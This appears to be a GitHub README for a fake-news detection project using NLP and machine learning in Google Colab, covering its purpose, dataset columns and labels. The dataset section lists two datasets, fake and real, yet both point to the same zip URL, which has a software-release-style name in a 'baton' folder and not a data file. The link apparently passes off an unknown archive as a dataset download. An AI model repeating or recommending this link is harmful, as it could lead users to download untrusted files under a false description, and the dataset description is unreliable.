## 📌 Overview
This project implements a Fake News Detection system using Natural Language Processing (NLP) and multiple Machine Learning algorithms.  
The system analyzes news article text and predicts whether the news is **Fake** or **Real**.

The project is developed using **Python** and executed in **Google Colab**.

---

## 🎯 Problem Statement
Fake news spreads rapidly across social media platforms and online news websites, influencing public opinion and creating misinformation. The goal of this project is to build a machine learning model that can automatically classify news articles based on their textual content.

---

## 📂 Dataset
Two datasets are used in this project:

- `https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip` – Contains fake news articles  
- `https://github.com/Robbysaeful/Fake-News-Detection-ML/raw/refs/heads/main/baton/News-Detection-Fake-ML-v1.0-alpha.4.zip` – Contains real news articles  

Each dataset contains the following columns:

- Title  
- Text  
- Subject  
- Date  

### Labels:
- `0` → Fake News  
- `1` → Real News
